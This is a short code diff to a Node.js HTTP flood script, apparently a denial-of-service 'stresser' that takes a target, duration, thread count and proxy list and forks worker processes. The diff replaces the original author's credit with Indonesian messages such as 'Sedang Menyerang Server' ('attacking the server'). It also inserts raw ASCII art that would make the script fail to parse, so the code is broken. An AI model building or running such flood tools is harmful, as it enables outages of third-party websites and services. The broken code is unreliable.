@@ -16,7 +16,7 @@ process.setMaxListeners(0);
 
 
 if (process.argv.length < 7) {
-    console.log(`Usage: ${process.argv[1]} target time threads reqs proxyfile GET/PRI | MADE BY @MSIDSTRESS`)
+    console.log(`Usage: ${process.argv[1]} target time threads reqs proxyfile GET/PRI | CONTOHNYA`)
     process.exit(1)
 }
 
@@ -30,8 +30,13 @@ var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').
 var parsed = url.parse(target);
 const payload = {};
 
+           /----/      /       /   //////   ////
+          /      /     /     /    /////    / // / 
+         /_  _  /     //////     //////   /////
+        /
+
 if (cluster.isMaster) {
-	console.log('Attack Started | FLOOD MADE BY [@MISDSTRESS]');
+	console.log('Sedang Menyerang Server');
    for (let ads = 0; ads < threads; ads++) {
        cluster.fork();
    }
